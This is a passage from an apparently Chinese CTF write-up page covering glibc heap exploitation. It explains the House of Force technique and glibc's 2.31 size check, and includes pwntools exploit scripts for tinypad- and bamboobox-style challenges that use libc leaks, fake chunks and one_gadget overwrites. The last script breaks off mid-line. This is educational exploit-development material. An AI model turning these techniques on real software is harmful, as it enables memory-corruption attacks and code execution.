class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">4</span>)</span><br><span class="line">	tinypad=<span class="number">0x602040</span></span><br><span class="line">	prev_size=heap_addr-<span class="number">0x602040</span></span><br><span class="line">	environ=libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">	one_gadget=libc.address+<span class="number">0x45226</span></span><br><span class="line">	add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">	add(<span class="number">0x100</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x11</span>))<span class="comment">#!!!</span></span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">0x18</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>+p64(prev_size))</span><br><span class="line">	fakechunk=<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(tinypad+<span class="number">0x20</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)<span class="comment">#!!!</span></span><br><span class="line">	edit(<span class="number">3</span>,fakechunk)</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	<span class="comment">#p.recv()</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(environ))</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	edit(<span class="number">4</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>+<span class="number">0x58</span>)*<span class="number">2</span>)</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	<span class="built_in">print</span>(p.recv())<span class="comment">#too much,可以接收太多遗留信息了,以后函数尽量使用sendlineafter编写</span></span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	<span class="comment">#p.recvall()</span></span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	add(<span class="number">0xf0</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xd0</span>+p64(<span class="number">666</span>)+p64(environ)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x602148</span>))</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;INDEX: 1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">	main_ret=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">240</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(main_ret))</span><br><span class="line">	edit(<span class="number">2</span>,p64(main_ret))</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	edit(<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">	quit()</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	exp()</span><br></pre></td></tr></table></figure>
<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><h2 id="概要-1"><a href="#概要-1" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House Of Force 是一种堆利用方法,主要通过修改top_chunk的size足够大使得申请出一个偏移大小的chunk后,top_chunk更新到指向目标地址,当再次申请chunk时得到一个包含目标地址的chunk</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
<li>能够自由地控制堆分配尺寸的大小</li>
</ol>
<p><strong>利用效果:</strong>得到一个几乎可以指向任何位置的chunk</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理,进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。</p>
<p>glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是前面说的需要一个能够控制 top chunk size 域的漏洞。</p>
<p>一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成<strong>无符号数</strong>，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证</p>
<p>之后会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。</p>
<p>与此同时，我们需要注意的是，topchunk 的 size 也会更新</p>
<p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p>
<h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><p><strong>篡改 <code>malloc@got.plt</code> 实现劫持程序流程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    long *ptr,*ptr2;</span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    ptr=(long *)(((long)ptr)+24);</span><br><span class="line">    *ptr=-1;        // &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span><br><span class="line">    malloc(-4120);  // &lt;=== 减小top chunk指针</span><br><span class="line">    malloc(0x10);   // &lt;=== 分配块实现任意地址写</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先，我们分配一个 0x10 字节大小的块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== ptr</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>之后把 top chunk 的 size 改为 0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== ptr</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0xffffffffffffffff &lt;=== top chunk size域被更改</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>注意此时的 top chunk 位置，当我们进行下一次分配的时候就会更改 top chunk 的位置到我们想要的地方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000602020 &lt;=== top chunk此时一切正常</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>
<p>接下来我们执行<code>malloc(-4120);</code>，-4120 是怎么得出的呢？ 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x601020:   0x00007ffff7a91130 &lt;=== malloc@got.plt</span><br></pre></td></tr></table></figure>
<p>所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p>
<p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p>
<p><code>0x601010-0x602020=-4112</code></p>
<p>因此，我们当调用<code>malloc(-4120)</code>之后，我们可以观察到 top chunk 被抬高到我们想要的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:\   0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x0000000000601010 &lt;=== 可以观察到top chunk被抬高</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>
<p>之后分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p>
<p>但是需要注意的是，在被抬高的同时，<strong>malloc@got 附近的内容也会被修改。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_head(victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br></pre></td></tr></table></figure>
<h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h3><p>在上一个示例中，演示了通过 HOF 使得 top chunk 的指针减小来修改位于其上面 (低地址) 的 got 表中的内容， 但是 HOF 其实也可以使得 top chunk 指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    long *ptr,*ptr2;</span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    ptr=(long *)(((long)ptr)+24);</span><br><span class="line">    *ptr=-1;                 &lt;=== 修改top chunk size</span><br><span class="line">    malloc(140737345551056); &lt;=== 增大top chunk指针</span><br><span class="line">    malloc(0x10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到程序代码与简单示例 1 基本相同，除了第二次 malloc 的 size 有所不同。 这次我们的目标是 malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1</span><br><span class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br></pre></td></tr></table></figure>
<p>可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk 指针的值来实现对 malloc_hook 的写。 首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 ，采取计算</p>
<p><code>0x7ffff7dd1b00-0x602020-0x10=140737345551056</code> 经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000  0x00007ffff7dd1b00 &lt;=== top chunk</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000  0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>
<p>之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = 0x00007ffff7dd1b10</span><br><span class="line"></span><br><span class="line">0x400562 &lt;main+60&gt;        mov    edi, 0x10</span><br><span class="line">0x400567 &lt;main+65&gt;        call   0x400410 &lt;malloc@plt&gt;</span><br></pre></td></tr></table></figure>
<h2 id="2-31新限制"><a href="#2-31新限制" class="headerlink" title="2.31新限制"></a>2.31新限制</h2><p>主要是对申请大小也有限制</p>
<p><strong>2.31以前:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure>
<ol>
<li>需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于等于 -2 * MINSIZE(32位0x10,64位0x20)，这个一般情况下都是可以满足的。</li>
<li>需要使得 <code>request2size</code>正好转换为目标地址对应偏移的大小,注意负数与无符号数的对应</li>
</ol>
<p>这里需要注意的一个点是,虽然代码中request2size在REQUEST_OUT_OF_RANGE的后面,但是实际上运行中比较<code>((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</code>时,其实已经执行了request2size,也就是req已经是最终需要申请的大小</p>
<p><strong>2.31及以后:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">checked_request2size</span> <span class="params">(<span class="type">size_t</span> req, <span class="type">size_t</span> *sz)</span> __<span class="title function_">nonnull</span> <span class="params">(<span class="number">1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (req &gt; PTRDIFF_MAX))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  *sz = request2size (req);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTRDIFF_MAX INT64_MAX</span></span><br><span class="line">Expands to:</span><br><span class="line"><span class="number">0x7FFFFFFFFFFFFFFF</span><span class="comment">//有符号下最大的正整数</span></span><br></pre></td></tr></table></figure>
<p>对申请大小的检测多了一道,需要不大于有符号下最大的正整数</p>
<p>也就是说不能申请一个负数了,该攻击手法不能向低地址申请任意chunk了</p>
<h2 id="例题1-bamboobox"><a href="#例题1-bamboobox" class="headerlink" title="例题1-bamboobox"></a>例题1-bamboobox</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bbb&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>程序有一个magic后门</p>
<p>程序虽然没有pie,但是堆基址依然会随机化,虽然可以泄露,并以此修改got表虽然可以做,但会更麻烦一点</p>
<p>程序在开始申请了一个chunk专门用于存放两个函数指针,分别是进入程序和退出程序时的提示信息</p>
<p>而且程序在edit时,输入大小是自己任意指定的</p>
<p>所以利用house of force</p>
<p>分配chunk到第一个chunk中并修改函数指针,并退出</p>
<p>即可触发magic</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf_path=<span class="string">&#x27;./bbb&#x27;</span></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line">p=process(elf_path)</span><br><span class="line"></span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,tbs(choice))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;item name:&#x27;</span>,tbs(size))</span><br><span class="line">	sa(<span class="string">b&#x27;item:&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="built_in">str</span>(idx).encode()+<span class="string">b&#x27; : &#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;index of item:&#x27;</span>,tbs(idx))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;of item:&#x27;</span>,tbs(idx))</span><br><span class="line">	sla(<span class="string">b&#x27;item name:&#x27;</span>,tbs(size))</span><br><span class="line">	sa(<span class="string">b&#x27;the item:&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">	magic=<span class="number">0x400d49</span></span><br><span class="line">	add(<span class="number">0x20</span>, <span class="string">b&quot;d&quot;</span>) </span><br><span class="line">	payload = <span class="number">0x28</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">	edit(<span class="number">0</span>, <span class="number">0x41</span>, payload)</span><br><span class="line">	offset=-<span class="number">0x30</span>-<span class="number">0x20</span>-<span class="number">0x8</span></span><br><span class="line">	<span 